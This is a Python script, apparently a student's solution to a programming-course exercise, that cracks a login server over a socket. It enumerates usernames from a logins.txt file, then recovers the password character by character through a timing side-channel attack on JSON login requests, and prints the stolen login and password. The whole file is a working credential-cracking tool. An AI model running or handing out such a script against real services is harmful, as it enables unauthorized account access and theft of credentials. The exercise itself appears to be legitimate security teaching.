# write your code here
import socket
import sys
import string
import os
import json
from datetime import datetime


def logins():
    with open(f'{os.getcwd()}/hacking/logins.txt', 'r') as login_file:
        for login in login_file.read().strip().split('\n'):
            yield login


class PasswordHacker:
    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = int(port)
        self.password = None
        self.login = None

    def establish_connection(self):
        with socket.socket() as client_socket:
            try:
                client_socket.connect((self.ip_address, self.port))
            except ConnectionError:
                pass
            else:
                for login in logins():
                    self.login = login
                    credentials = f'{{"login": "{self.login}", "password": " "}}'
                    client_socket.send(credentials.encode())
                    if json.loads(client_socket.recv(1024).decode())["result"] == "Wrong password!":
                        break
            tmp_password = ""
            found = False
            while True:
                if found:
                    break
                for char in f'{string.ascii_letters}{string.digits}':
                    self.password = f'{tmp_password}{char}'
                    credentials = f'{{"login": "{self.login}", "password": "{self.password}"}}'
                    try:
                        start = datetime.now()
                        client_socket.send(credentials.encode())
                        response = json.loads(client_socket.recv(1024).decode())
                        finish = datetime.now()
                        difference = finish - start
                    except ConnectionError:
                        pass
                    except json.decoder.JSONDecodeError:
                        pass
                    else:
                        if difference.microseconds > 1000:
                            tmp_password = self.password
                        if response["result"] == "Connection success!":
                            print(json.dumps(dict([("login", self.login), ("password", self.password)])))
                            found = True


def main():
    ip_address, port = sys.argv[1:]
    password_hacker = PasswordHacker(ip_address, port)
    password_hacker.establish_connection()


if __name__ == "__main__":
    main()
